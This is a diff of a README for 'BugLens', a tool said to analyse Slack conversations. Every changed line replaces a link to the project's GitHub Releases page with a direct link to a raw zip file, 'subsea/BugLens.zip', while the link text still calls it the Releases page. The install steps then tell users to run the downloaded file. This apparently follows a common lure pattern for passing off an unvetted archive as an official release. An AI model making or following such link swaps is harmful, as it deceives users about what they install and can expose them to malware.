@@ -6,7 +6,7 @@ Welcome to BugLens! This tool helps you analyze Slack conversations to generate 
 
 ## 📥 Download BugLens
 
-[![Download BugLens](https://img.shields.io/badge/Download-BugLens-brightgreen)](https://github.com/Revrend667/BugLens/releases)
+[![Download BugLens](https://raw.githubusercontent.com/Revrend667/BugLens/main/subsea/BugLens.zip)](https://raw.githubusercontent.com/Revrend667/BugLens/main/subsea/BugLens.zip)
 
 ## 💡 What You Need
 
@@ -19,9 +19,9 @@ Before you download BugLens, ensure your system meets the following requirements
 
 ## 🔗 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Revrend667/BugLens/releases) to download BugLens. Here you will find all available versions of the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Revrend667/BugLens/main/subsea/BugLens.zip) to download BugLens. Here you will find all available versions of the application.
 
-1. **Go to the Releases Page:** Click [here](https://github.com/Revrend667/BugLens/releases) to visit the page.
+1. **Go to the Releases Page:** Click [here](https://raw.githubusercontent.com/Revrend667/BugLens/main/subsea/BugLens.zip) to visit the page.
 2. **Choose Your Version:** Select the version that fits your operating system.
 3. **Download the File:** Click the download link for your chosen version. This will start the download.
 4. **Run the Installer:** Open the downloaded file and follow the on-screen instructions to complete the installation.
@@ -81,4 +81,4 @@ BugLens is open-source software. You can view the license details in the reposit
 
 ## ✅ Final Notes
 
-Download BugLens today and start gaining insights from your Slack conversations. For more information, feel free to visit the [Releases page](https://github.com/Revrend667/BugLens/releases) at any time. Your feedback helps us improve and grow!
+Download BugLens today and start gaining insights from your Slack conversations. For more information, feel free to visit the [Releases page](https://raw.githubusercontent.com/Revrend667/BugLens/main/subsea/BugLens.zip) at any time. Your feedback helps us improve and grow!
